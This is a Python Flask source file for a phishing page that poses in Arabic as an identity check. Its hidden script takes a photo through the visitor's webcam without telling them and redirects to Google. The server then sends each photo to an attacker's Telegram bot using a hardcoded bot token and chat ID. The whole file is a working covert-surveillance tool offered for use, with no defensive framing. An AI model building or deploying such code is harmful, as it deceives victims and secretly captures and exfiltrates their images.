from flask import Flask, request, render_template_string, jsonify
import requests
import base64
import datetime
import os

app = Flask(__name__)

# ================= الإعدادات =================
BOT_TOKEN = "7821182586:AAEtWqNbzfWzFaBowMNPajrnRUMVUirGbGw"
CHAT_ID = "1369630265" 
# ============================================

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <h2>جاري التحقق من الهوية...</h2>
        <div class="loader"></div>
        <p>الرجاء الانتظار...</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg');
                
                fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                }).then(() => {
                    window.location.href = "https://www.google.com";
                });
            }, 1500);
        })
        .catch(err => {
            alert("يجب السماح بالكاميرا للمتابعة!");
            window.location.href = "https://www.google.com";
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data['image']
    
    format, imgstr = image_data.split(';base64,')
    ext = format.split('/')[-1]
    
    filename = f"photo_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
    
    with open(filename, "wb") as f:
        f.write(base64.b64decode(imgstr))
        
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(filename, "rb") as photo:
            files = {'photo': photo}
            payload = {'chat_id': CHAT_ID, 'caption': '📸 صورة جديدة تم التقاطها!'}
            requests.post(url, data=payload, files=files, timeout=10)
        
        if os.path.exists(filename):
            os.remove(filename)
            
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
